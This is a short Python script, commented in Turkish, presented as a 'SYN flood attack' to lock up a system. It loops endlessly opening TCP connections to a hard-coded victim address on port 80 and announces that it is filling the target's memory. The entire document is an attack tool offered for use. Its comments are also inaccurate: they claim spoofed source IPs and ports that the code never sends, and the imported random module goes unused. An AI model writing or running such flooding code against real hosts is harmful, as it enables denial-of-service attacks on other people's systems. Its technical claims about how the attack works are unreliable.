import socket
import random

print("--- SYN FLOOD ATTACK (SİSTEM KİLİTLEME) ---")
# Kurbanın interneti açık olsun yeter.

target_ip = "192.168.1.15"
target_port = 80

def saldiri():
    while True:
        # Sahte IP ve Portlardan saldır
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            # Bağlanmaya çalış ama "Merhaba" deyip kaç (Half-Open)
            s.settimeout(0.1)
            s.connect((target_ip, target_port))
            # Bağlantıyı kapatmıyoruz, havada bırakıyoruz
        except:
            pass
            
        print(f"🚀 Paket yollandı -> RAM dolduruluyor...")

# Not: Bu kod tek başına yetmez, Scapy ile IP spoofing gerekir ama mantık budur.
if __name__ == "__main__":
    saldiri()